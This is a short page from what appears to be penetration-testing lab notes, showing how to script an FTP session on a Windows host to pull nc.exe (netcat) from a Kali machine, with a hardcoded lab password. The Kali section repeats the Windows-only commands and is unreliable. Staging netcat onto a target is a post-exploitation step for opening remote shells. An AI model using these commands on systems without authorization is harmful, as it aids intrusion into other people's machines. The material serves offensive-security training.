---
title: FTP File Transfer
layout: default
nav_order: 3
parent: File Transfers

---

# FTP 
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }
1. TOC
{:toc}

---
### FTP File Transfer

Transfer nc.exe using FTP from Linux to Windows. Make sure to transfer file to `/ftphome`

#### On Windows Machine: 
```powershell
PS C:\Tools\active_directory> echo 'open 192.168.119.128 21' > file.txt
PS C:\Tools\active_directory> echo 'USER offsec' >> file.txt
PS C:\Tools\active_directory> echo '123abc123foryouandme' >> file.txt
PS C:\Tools\active_directory> echo 'binary' >> file.txt
PS C:\Tools\active_directory> echo 'GET nc.exe' >> file.txt
PS C:\Tools\active_directory> echo 'bye' >> file.txt
PS C:\Tools\active_directory> ftp -v -n -s:file.txt
```

#### On Kali Machine: 
```bash
echo 'open 192.168.119.128 21' > file.txt
echo 'USER offsec' >> file.txt
echo '123abc123foryouandme' >> file.txt
echo 'binary' >> file.txt
echo 'GET nc.exe' >> file.txt
echo 'bye' >> file.txt
ftp -v -n -s:file.txt
```